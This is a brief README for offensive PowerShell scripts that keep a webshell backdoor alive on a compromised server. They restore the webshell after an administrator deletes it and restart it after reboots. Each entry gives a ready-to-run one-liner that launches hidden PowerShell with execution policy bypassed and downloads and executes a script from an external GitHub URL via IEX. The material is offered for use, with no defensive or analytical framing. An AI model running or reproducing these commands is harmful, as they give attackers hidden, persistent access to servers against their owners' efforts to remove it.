# some script for web backdoor



* Backd00r-webshell.ps1  
if the webshell script has been deleted by admin, then this script of powershell will recovery webshell script own yet.  
usage:  
powershell.exe -nop -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cgke/script/master/Backd00r-webshell.ps1');Backd00r-webshell"


* autostart.ps1  
if the server was restarted, and the poweshell willl be killed,so we need start the script of powershell and download Backd00r-webshell.ps1.  
usage:  
powershell.exe -nop -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cgke/script/master/autostart.ps1');autostart."
